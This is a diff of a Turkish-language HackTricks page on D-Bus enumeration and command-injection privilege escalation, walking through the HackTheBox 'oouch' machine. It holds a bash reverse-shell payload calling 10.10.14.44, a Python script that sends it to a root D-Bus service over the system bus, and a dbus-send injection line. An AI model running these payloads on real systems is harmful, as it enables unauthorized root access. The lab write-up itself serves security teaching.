@@ -1,26 +1,27 @@
 # D-Bus Numaralandırma ve Komut Enjeksiyonu Yetki Yükseltme
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
 ## **GUI numaralandırma**
 
-D-Bus, Ubuntu masaüstü ortamlarında ara işlem iletişim (IPC) arabirimi olarak kullanılır. Ubuntu'da, birkaç mesaj otobüsünün eşzamanlı çalışması gözlemlenir: sistem otobüsü, **sistem genelinde ilgili hizmetleri sunmak için ayrıcalıklı hizmetler tarafından kullanılan** ve her oturum açmış kullanıcı için bir oturum otobüsü, yalnızca o belirli kullanıcıyla ilgili hizmetleri sunan. Buradaki odak noktası, ayrıcalıklarını yükseltmek amacıyla daha yüksek ayrıcalıklarda (örneğin, root) çalışan hizmetlerle ilişkili olan sistem otobüsüdür. D-Bus'ın mimarisi, her oturum otobüsü için bir 'yönlendirici' kullanır ve bu yönlendirici, istemcilerin iletişim kurmak istedikleri hizmete göre istemci mesajlarını uygun hizmetlere yönlendirmekten sorumludur.
+D-Bus, Ubuntu masaüstü ortamlarında ara işlem iletişimleri (IPC) arabirimi olarak kullanılır. Ubuntu'da, birkaç mesaj otobanının eşzamanlı çalıştığı gözlemlenir: sistem otobanı, genellikle **sistem genelinde ilgili hizmetleri sunmak için ayrıcalıklı hizmetler tarafından kullanılan** ve her oturum açılan kullanıcı için bir oturum otobanı, yalnızca o belirli kullanıcı için ilgili hizmetleri sunan. Buradaki odak noktası, ayrıcalıklı hizmetlerin çalıştığı daha yüksek ayrıcalıklarla (örneğin, kök) ilişkilendirilen sistem otobanıdır çünkü amacımız ayrıcalıkları yükseltmektir. D-Bus'ın mimarisinin her oturum otobanı için bir 'yönlendirici' kullandığı, bu yönlendiricinin, istemcilerin iletişim kurmak istedikleri hizmetlere göre istemci mesajlarını yönlendirmekten sorumlu olduğu belirtilmiştir.
 
-D-Bus üzerindeki hizmetler, sundukları **nesneler** ve **arayüzler** tarafından tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir ve her örnek, bir **nesne yolu** tarafından benzersiz bir şekilde tanımlanır. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sunulan her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsili olan **org.freedesktop.DBus.Introspectable** arayüzüdür. Bu yöntem, özellikler ve sinyalleri atlayarak, burada yöntemlere odaklanır.
+D-Bus'taki hizmetler, sundukları **nesneler** ve **arayüzler** tarafından tanımlanır. Nesneler, her biri benzersiz bir **nesne yolunu** tanımlayan standart OOP dillerindeki sınıf örneklerine benzetilebilir. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sunulan her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, yalnızca bir yöntem olan Introspect yöntemine sahip olan **org.freedesktop.DBus.Introspectable** arayüzüdür. Bu yöntem, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsilini döndürür, burada özellikleri ve sinyalleri atlayarak yöntemlere odaklanır.
 
-D-Bus arabirimine iletişim için iki araç kullanıldı: D-Bus tarafından sunulan yöntemleri kolayca çağırmak için bir CLI aracı olan **gdbus** ve her otobüste mevcut olan hizmetleri numaralandırmak ve her hizmetin içerdiği nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
+D-Bus arabirimine iletişim için iki araç kullanıldı: D-Bus tarafından sunulan yöntemleri betiklerde kolayca çağırmak için **gdbus** adlı bir CLI aracı ve [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), her otobanda mevcut hizmetleri numaralandırmak ve her hizmetin içinde bulunan nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -28,21 +29,22 @@ sudo apt-get install d-feet
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-İlk resimde D-Bus sistem otobüsüne kaydedilen servisler gösterilmektedir ve özellikle Sistem Otobüsü düğmesi seçildikten sonra **org.debin.apt** vurgulanmaktadır. D-Feet bu servisi nesneler için sorgular ve seçilen nesneler için arabirimleri, yöntemleri, özellikleri ve sinyalleri görüntüler, ikinci resimde görüldüğü gibi. Her yöntemin imzası da detaylı olarak gösterilir.
 
-Dikkate değer bir özellik, servisin **işlem kimliği (pid)** ve **komut satırı**nın görüntülenmesidir, bu da servisin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için kullanışlıdır ve araştırma açısından önemlidir.
+İlk resimde D-Bus sistem otobüsüne kaydedilen servisler gösterilmekte, özellikle Sistem Otobüsü düğmesi seçildikten sonra **org.debin.apt** vurgulanmaktadır. D-Feet bu servisi nesneler için sorgular ve seçilen nesneler için arayüzleri, yöntemleri, özellikleri ve sinyalleri görüntüler, ikinci resimde görüldüğü gibi. Her yöntemin imzası da detaylı olarak verilir.
 
-**D-Feet ayrıca yöntem çağrısına izin verir**: kullanıcılar parametre olarak Python ifadelerini girebilir ve D-Feet bu ifadeleri D-Bus türlerine dönüştürerek servise iletilir.
+Dikkate değer bir özellik, servisin **işlem kimliği (pid)** ve **komut satırının** görüntülenmesidir; bu, servisin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için faydalıdır ve araştırma açısından önemlidir.
 
-Ancak, **bazı yöntemlerin çağrılabilmesi için kimlik doğrulaması gerekmektedir**. İlk etapta kimlik bilgileri olmadan ayrıcalıkları yükseltmek amacımız olduğu için bu yöntemleri göz ardı edeceğiz.
+**D-Feet ayrıca yöntem çağrısına izin verir**: kullanıcılar parametre olarak Python ifadeleri girebilir, D-Feet bu ifadeleri D-Bus türlerine dönüştürerek servise iletmektedir.
 
-Ayrıca, bazı servisler belirli eylemleri gerçekleştirmeye izin verilip verilmeyeceğini belirlemek için başka bir D-Bus servisi olan org.freedeskto.PolicyKit1'i sorgular.
+Ancak, **bazı yöntemlerin çağrılabilmesi için kimlik doğrulaması gerekebilir**. Bu yöntemleri göz ardı edeceğiz, çünkü amacımız öncelikle kimlik bilgileri olmadan ayrıcalıklarımızı yükseltmektir.
+
+Ayrıca, bazı servislerin belirli eylemleri gerçekleştirmeye izin verilip verilmeyeceğini belirlemek için başka bir D-Bus servisi olan org.freedeskto.PolicyKit1'i sorguladığını unutmayın.
 
 ## **Komut Satırı Sıralaması**
 
 ### Servis Nesnelerini Listeleme
 
-Açık D-Bus arabirimlerini listelemek mümkündür:
+Açık D-Bus arayüzlerini listelemek mümkündür:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,11 +70,11 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### Bağlantılar
 
-[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir işlem bir otobüse bağlantı kurduğunda, otobüs bağlantıya _benzersiz bağlantı adı_ adı verilen özel bir otobüs adı atar. Bu tür otobüs adları değişmezdir - bağlantı var olduğu sürece değişmeyeceği garanti edilir - ve daha da önemlisi, otobüs ömrü boyunca yeniden kullanılamazlar. Bu, aynı işlem otobüs bağlantısını kapatıp yeni bir bağlantı oluştursa bile, başka bir bağlantının bu tür benzersiz bağlantı adı atanmayacağı anlamına gelir. Benzersiz bağlantı adları kolayca tanınır çünkü—aksi takdirde yasak olan—iki nokta karakteriyle başlar.
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Bir işlem bir otobüse bağlantı kurduğunda, otobüs bağlantıya _benzersiz bağlantı adı_ adı verilen özel bir otobüs adı atar. Bu tür otobüs adları değişmezdir - bağlantı var olduğu sürece değişmeyeceği garanti edilir - ve daha da önemlisi, otobüs ömrü boyunca tekrar kullanılamazlar. Bu, aynı işlem otobüs bağlantısını kapatıp yeni bir tane oluştursa bile, başka bir bağlantının bu tür benzersiz bağlantı adını asla atamayacağı anlamına gelir. Benzersiz bağlantı adları kolayca tanınabilir çünkü—aksi takdirde yasak olan—iki nokta karakteri ile başlar.
 
 ### Servis Nesne Bilgisi
 
-Ardından, arayüz hakkında bazı bilgiler alabilirsiniz:
+Daha sonra, arayüz hakkında bazı bilgiler alabilirsiniz:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -132,7 +134,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Bir Hizmet Nesnesinin Arayüzlerini Listeleme
+### Bir Hizmet Nesnesinin Arayüzlerini Listele
 
 Yeterli izinlere sahip olmanız gerekmektedir.
 ```bash
@@ -142,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Bir Hizmet Nesnesinin Introspect Arayüzü
+### Bir Hizmet Nesnesinin Arayüzünü İnceleyin
 
-Bu örnekte, `tree` parametresi kullanılarak en son keşfedilen arayüzün seçildiğine dikkat edin (_önceki bölüme bakınız_):
+Bu örnekte, `tree` parametresini kullanarak keşfedilen en son arayüzün nasıl seçildiğine dikkat edin (_önceki bölüme bakınız_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,21 +166,23 @@ org.freedesktop.DBus.Properties     interface -         -            -
 ```
 ### İzleme/Yakalama Arayüzü
 
-Yeterli ayrıcalıklara sahipseniz (`send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir), bir D-Bus iletişimini **izleyebilirsiniz**.
+Yeterli ayrıcalıklarla (sadece `send_destination` ve `receive_sender` ayrıcalıkları yeterli değil) bir **D-Bus iletişimini izleyebilirsiniz**.
 
-Bir iletişimi **izlemek** için **root** olmanız gerekmektedir. Hala root olma konusunda sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakabilirsiniz.
+Bir **iletişimi izlemek** için **root** olmanız gerekecektir. Hala root olmakta sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakabilirsiniz.
 
 {% hint style="warning" %}
-Bir D-Bus yapılandırma dosyasını **root olmayan kullanıcıların iletişimi dinlemesine izin verecek şekilde yapılandırmayı** biliyorsanız, lütfen **benimle iletişime geçin**!
+Bir D-Bus yapılandırma dosyasını **kök olmayan kullanıcıların iletişimi izlemesine izin verecek şekilde yapılandırmayı** biliyorsanız lütfen **benimle iletişime geçin**!
 {% endhint %}
 
-İzlemek için farklı yöntemler:
+İzlemek için farklı yollar:
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **yanlış iletişim yoluyla "**_**lalalalal**_**" mesajı gönderilir**:
+```html
+<p>İlgili örnekte `htb.oouch.Block` arayüzü izlenir ve **"**_**lalalalal**_**" mesajı yanlış iletişim yoluyla gönderilir:</p>
+```
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -197,15 +201,13 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-Sonuçları bir pcap dosyasında kaydetmek için `monitor` yerine `capture` kullanabilirsiniz.
-
 #### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Eğer otobüste çok fazla bilgi varsa, aşağıdaki gibi bir eşleşme kuralı geçin:
+Eğer otobüste çok fazla bilgi varsa, aşağıdaki gibi bir eşleşme kuralı geçirin:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Birden çok kural belirtilebilir. Bir ileti, kurallardan _herhangi birini_ karşılarsa, ileti yazdırılır. Aşağıdaki gibi:
+Birden fazla kural belirtilebilir. Bir ileti, kuralların _herhangi birini_ karşılarsa ileti yazdırılacaktır. Örneğin:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -217,11 +219,11 @@ Daha fazla bilgi için [D-Bus belgelerine](http://dbus.freedesktop.org/doc/dbus-
 
 ### Daha Fazla
 
-`busctl` daha fazla seçeneğe sahiptir, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl`'nin daha fazla seçeneği var, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
 ## **Zayıf Senaryo**
 
-HTB'deki "oouch" ana bilgisayarı içindeki **qtc kullanıcısı olarak**, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda **beklenmeyen bir D-Bus yapılandırma dosyası** bulabilirsiniz:
+**HTB'den "oouch" ana bilgisayarındaki qtc kullanıcısı olarak**, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda **beklenmeyen bir D-Bus yapılandırma dosyası** bulabilirsiniz:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -242,7 +244,7 @@ HTB'deki "oouch" ana bilgisayarı içindeki **qtc kullanıcısı olarak**, _/etc
 
 </busconfig>
 ```
-Önceki yapılandırmadan not edin ki, bu D-BUS iletişimi aracılığıyla bilgi göndermek ve almak için **`root` veya `www-data` kullanıcısı olmanız gerekecektir**.
+Önceki yapılandırmadan **bu D-BUS iletişimi aracılığıyla bilgi gönderip almak için `root` veya `www-data` kullanıcısı olmanız gerekeceğini** unutmayın.
 
 Docker konteyneri **aeb4525789d8** içindeki **qtc** kullanıcısı olarak, _/code/oouch/routes.py_ dosyasında bazı dbus ile ilgili kodları bulabilirsiniz. İlgili kodlar şunlardır:
 ```python
@@ -256,14 +258,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Gördüğünüz gibi, bir D-Bus arabirimine bağlanıyor ve "Block" işlevine "client_ip" bilgisini gönderiyor.
+Gördüğünüz gibi, **bir D-Bus arayüzüne bağlanıyor** ve "Block" fonksiyonuna "client\_ip" bilgisini gönderiyor.
 
-D-Bus bağlantısının diğer tarafında çalışan derlenmiş bir C kodu bulunmaktadır. Bu kod, D-Bus bağlantısında IP adresini dinlemekte ve `system` işlevi aracılığıyla iptables'i çağırmaktadır.\
-`system` işlevine yapılan çağrı, komut enjeksiyonuna karşı kasten savunmasızdır, bu nedenle aşağıdaki gibi bir payload ters kabuk oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+D-Bus bağlantısının diğer tarafında çalışan derlenmiş bir C binary bulunmaktadır. Bu kod, D-Bus bağlantısında **IP adresini dinliyor ve `system` fonksiyonu aracılığıyla iptables'ı çağırıyor** verilen IP adresini engellemek için.\
+**`system` fonksiyonuna yapılan çağrı, bilerek komut enjeksiyonuna açıktır**, bu nedenle aşağıdaki gibi bir yükleme ters kabuk oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Sömürün
+### Sızma
 
-Bu sayfanın sonunda, D-Bus uygulamasının tam C kodunu bulabilirsiniz. İçinde, 91-97 satırları arasında `D-Bus nesne yolu` ve `arayüz adının` nasıl kaydedildiğini bulabilirsiniz. Bu bilgi, D-Bus bağlantısına bilgi göndermek için gereklidir:
+Bu sayfanın sonunda **D-Bus uygulamasının tam C kodunu** bulabilirsiniz. İçinde, 91-97 satırları arasında **`D-Bus nesne yolu`** ve **`arayüz adı`** nasıl **kaydedildiğini** bulabilirsiniz. Bu bilgiler, D-Bus bağlantısına bilgi göndermek için gereklidir:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -273,13 +275,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Ayrıca, 57. satırda **bu D-Bus iletişimi için kaydedilmiş tek yöntemin** `Block` adında olduğunu görebilirsiniz (_**Bu nedenle, aşağıdaki bölümde yükler hizmet nesnesine `htb.oouch.Block`, arayüze `/htb/oouch/Block` ve yöntem adına `Block` gönderilecektir**_):
+Ayrıca, 57. satırda **bu D-Bus iletişimi için kayıtlı olan tek yöntemin** `Block` adında olduğunu bulabilirsiniz (_**Bu nedenle, aşağıdaki bölümde yükler hizmet nesnesine `htb.oouch.Block`, arayüze `/htb/oouch/Block` ve yöntem adına `Block` gönderilecektir**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Aşağıdaki python kodu, payload'ı `Block` yöntemine D-Bus bağlantısı üzerinden gönderecektir (`block_iface.Block(runme)` not edin ki bu, önceki kod parçasından çıkarılmıştır):
+Aşağıdaki python kodu, `Block` yöntemine `block_iface.Block(runme)` üzerinden D-Bus bağlantısına yük gönderecektir (_not: bu kod parçası önceki kod parçasından çıkarılmıştır_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -290,35 +292,17 @@ response = block_iface.Block(runme)
 bus.close()
 ```
 #### busctl ve dbus-send
-
-`busctl` and `dbus-send` are command-line tools used for interacting with the D-Bus system. D-Bus is a message bus system that allows communication between different processes on a Linux system.
-
-`busctl` is used to introspect and control the D-Bus bus. It provides information about available services, objects, and interfaces on the bus. With `busctl`, you can also send method calls and signals to D-Bus services.
-
-`dbus-send` is a utility for sending messages to a D-Bus message bus. It can be used to invoke methods on D-Bus objects and send signals. `dbus-send` is particularly useful for testing and debugging D-Bus services.
-
-Both `busctl` and `dbus-send` can be used for privilege escalation in certain scenarios. By exploiting vulnerabilities in D-Bus services or misconfigurations, an attacker can execute arbitrary commands with elevated privileges.
-
-#### busctl ve dbus-send
-
-`busctl` ve `dbus-send`, D-Bus sistemiyle etkileşimde kullanılan komut satırı araçlarıdır. D-Bus, bir Linux sisteminde farklı süreçler arasında iletişim sağlayan bir mesaj otobüsü sistemidir.
-
-`busctl`, D-Bus otobüsünü incelemek ve kontrol etmek için kullanılır. Otobüsteki mevcut hizmetler, nesneler ve arabirimler hakkında bilgi sağlar. `busctl` ile D-Bus hizmetlerine yöntem çağrıları ve sinyaller gönderebilirsiniz.
-
-`dbus-send`, bir D-Bus mesaj otobüsüne mesaj göndermek için kullanılan bir yardımcı programdır. D-Bus nesnelerinde yöntem çağırmak ve sinyaller göndermek için kullanılabilir. `dbus-send`, özellikle D-Bus hizmetlerini test etmek ve hata ayıklamak için kullanışlıdır.
-
-`busctl` ve `dbus-send`, belirli senaryolarda ayrıcalık yükseltme için kullanılabilir. D-Bus hizmetlerindeki güvenlik açıklarını veya yanlış yapılandırmaları sömürerek, saldırganlar yükseltilmiş ayrıcalıklarla keyfi komutlar yürütebilirler.
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send`, "Message Bus" adlı bir yazılıma mesaj göndermek için kullanılan bir araçtır.
-* Message Bus, sistemler arasında iletişimi kolaylaştırmak için kullanılan bir yazılımdır. Mesaj Sırası (mesajlar sırayla düzenlenir) ile ilgilidir, ancak Message Bus'ta mesajlar abonelik modelinde gönderilir ve çok hızlıdır.
-* "-system" etiketi, varsayılan olarak bir oturum mesajı olmayan bir sistem mesajını belirtmek için kullanılır.
-* "-print-reply" etiketi, mesajımızı uygun şekilde yazdırmak ve insan tarafından okunabilir bir formatta herhangi bir yanıt almak için kullanılır.
-* "-dest=Dbus-Interface-Block", Dbus arayüzünün adresidir.
-* "-string:", arayüze göndermek istediğimiz mesajın türüdür. Mesaj gönderme formatlarının çeşitli biçimleri vardır, örneğin double, bytes, booleans, int, objpath. Bunların dışında, "object path" bir dosyanın yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda bir komutu dosya adı olarak arayüze iletmek için özel bir dosya (FIFO) kullanabiliriz. "string:;": Bu, FIFO ters kabuk dosya/komutunun yerini tekrar çağırmak için nesne yolunu çağırmak içindir.
+* `dbus-send`, "Message Bus"e mesaj göndermek için kullanılan bir araçtır.
+* Message Bus - Sistemler arasında iletişimi kolaylaştırmak için kullanılan bir yazılımdır. Mesaj Kuyruğu ile ilgilidir (mesajlar sırayla düzenlenir), ancak Message Bus'ta mesajlar bir abonelik modelinde gönderilir ve ayrıca çok hızlıdır.
+* "-system" etiketi, varsayılan olarak bir oturum mesajı değil bir sistem mesajı olduğunu belirtmek için kullanılır.
+* "--print-reply" etiketi, mesajımızı uygun şekilde yazdırmak ve insan tarafından okunabilir bir formatta yanıtları almak için kullanılır.
+* "--dest=Dbus-Interface-Block" Dbus arayüzünün adresi.
+* "--string:" - Arayüze göndermek istediğimiz mesajın türü. Mesaj gönderme formatlarının çeşitli olduğu gibi double, bytes, booleans, int, objpath gibi mesaj gönderme formatları vardır. Bunların dışında, "object path" dosya yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda bir komutu dosya adı olarak arayüze iletmek için özel bir dosya (FIFO) kullanabiliriz. "string:;" - Bu, FIFO ters kabuk dosya/komutunun adını dosya olarak yerleştirdiğimiz yerde tekrar nesne yolunu çağırmak içindir.
 
-_Not olarak, `htb.oouch.Block.Block` içindeki ilk bölüm (`htb.oouch.Block`), hizmet nesnesine referans yaparken, son bölüm (`.Block`), yöntem adına referans yapar._
+_Not: `htb.oouch.Block.Block` içinde, ilk kısım (`htb.oouch.Block`) servis nesnesine referans verir ve son kısım (`.Block`) yöntem adını belirtir._
 
 ### C kodu
 
@@ -468,16 +452,17 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ## Referanslar
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
+{% hint style="success" %}
+AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
